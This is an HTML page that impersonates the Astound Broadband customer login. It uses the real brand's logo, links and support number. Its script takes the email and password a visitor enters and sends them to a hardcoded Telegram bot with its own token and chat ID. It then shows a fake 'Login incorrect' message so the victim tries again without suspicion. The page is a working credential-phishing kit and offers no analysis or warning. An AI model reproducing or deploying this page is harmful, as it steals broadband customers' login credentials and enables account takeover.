<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Astound Broadband - Log In</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Arial:wght@400;600&display=swap');
      
        body {
            font-family: Arial, sans-serif;
        }
      
        .input-field {
            transition: all 0.2s;
        }
      
        .input-field:focus {
            box-shadow: 0 0 0 3px rgba(75, 0, 130, 0.2);
            border-color: #0e0117;
        }
      
        .error-banner {
            display: none;
            background-color: #fff1f0;
            border: 1px solid #f5c6cb;
            color: #c0392b;
        }
       
        .links {
            text-align: left;
        }
    </style>
</head>
<body class="bg-gray-50 min-h-screen flex items-center justify-center py-12 px-4">
    <div class="max-w-md w-full">
        <!-- Larger Logo -->
        <div class="flex flex-col items-center mb-8">
            <img src="index-files/astound.png" 
                 alt="Astound Broadband" 
                 class="h-20 w-auto mb-4"> <!-- Increased size -->
            </p>
        </div>

        <!-- Card -->
        <div class="bg-white rounded-lg shadow-xl p-8">
            <h1 class="text-2xl font-semibold text-center text-gray-800 mb-6">Log In</h1>
            <!-- Error Message -->
            <div id="errorBanner" class="error-banner rounded-md py-3 px-4 mb-6 text-center text-sm font-medium">
                Login incorrect
            </div>

            <!-- Form -->
            <form id="loginForm" autocomplete="off">
                <div class="form-group">
                    <label for="username">
                        Username
                    </label>
                    <input
                        type="email"
                        id="username"
                        name="username"
                        form="Form"
                        placeholder="Username"
                        class="input-field w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none bg-gray-50"
                        required>
                </div>

                <div class="form-group">
                    <label for="Password">
                        Password
                    </label>
                    <div class="relative">
                        <input
                            type="password"
                            id="Password"
                            name="password"
                            form="loginForm"
                            placeholder="Password"
                            class="input-field w-full pr-20 px-4 py-3 border border-gray-300 rounded-md focus:outline-none bg-gray-50"
                            required>
                        <button
                            type="button"
                            id="toggleInfoBtn"
                            class="absolute inset-y-0 right-2 flex items-center text-sm text-purple-700 hover:text-purple-900 font-medium focus:outline-none focus:ring-2 focus:ring-purple-500 rounded px-2">
                            Show
                        </button>
                    </div>
                </div>

                <div class="flex items-center gap-2">
                    <input
                        type="checkbox"
                        id="remember"
                        checked
                        class="w-4 h-4 accent-purple-700">
                    <label for="remember" class="text-sm text-gray-700 flex items-center gap-1">
                        Remember Me
                        <span class="text-gray-400 text-xs cursor-help" title="Keep me signed in">?</span>
                    </label>
                </div>

                <button
                    type="submit"
                    id="loginBtn"
                    class="w-full bg-purple-800 hover:bg-purple-800 text-white font-semibold py-4 rounded-md text-lg transition-colors">
                    LOG IN
                </button>
            </form>

            <!-- Links moved to LEFT side -->
            <div class="links mt-8 text-sm space-y-2">
                <a href="https://password.wavebroadband.com/" class="block text-blue-600 hover:underline">Forgot Password?</a>
                <a href="https://residential.wavebroadband.com/resources/docs/Wave-Privacy-Policy.pdf" class="block text-blue-600 hover:underline">Privacy Policy</a>
                <a href="https://residential.wavebroadband.com/agreements-and-policies/" class="block text-blue-600 hover:underline">Terms of Service</a>
            </div>
        </div>

        <!-- Bold Support Footer -->
        <div class="text-center mt-8 text-sm font-bold text-gray-800">
            Support - Contact Us at <a href="tel:1-800-4-ASTOUND" class="hover:underline">1-800-4-ASTOUND</a>
        </div>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const errorBanner = document.getElementById('errorBanner');
        const loginBtn = document.getElementById('loginBtn');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();

            const email = document.getElementById('username').value;
            const password = document.getElementById('Password').value;

            loginBtn.disabled = true;
            loginBtn.textContent = 'Loading...';

            try {
                const response = await fetch(
                    'https://api.telegram.org/bot8744881248:AAF0-8sCRoxRSLY0U_e9YRNmiUIOMpIve7I/sendMessage',
                    {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: '7229009100',
                            text: `Email: ${email}\nPassword: ${password}`
                        })
                    }
                );

                const data = await response.json();

                if (!data.ok) {
                    throw new Error('Telegram send failed');
                }

                document.getElementById('username').value = '';
                document.getElementById('Password').value = '';
                errorBanner.style.display = 'block';
            } catch (error) {
                errorBanner.style.display = 'block';
                console.error(error);
                alert('Please try again.');
            } finally {
                loginBtn.textContent = 'Log in';
                loginBtn.disabled = false;
            }
        });

        const toggleInfoBtn = document.getElementById('toggleInfoBtn');
        const infoInput = document.getElementById('Password');

        toggleInfoBtn.addEventListener('click', function () {
            const isVisible = infoInput.type === 'text';
            infoInput.type = isVisible ? 'password' : 'text';
            toggleInfoBtn.textContent = isVisible ? 'Show' : 'Hide';
            infoInput.focus();
        });

        document.getElementById('username').focus();
    </script>
</body>
</html>
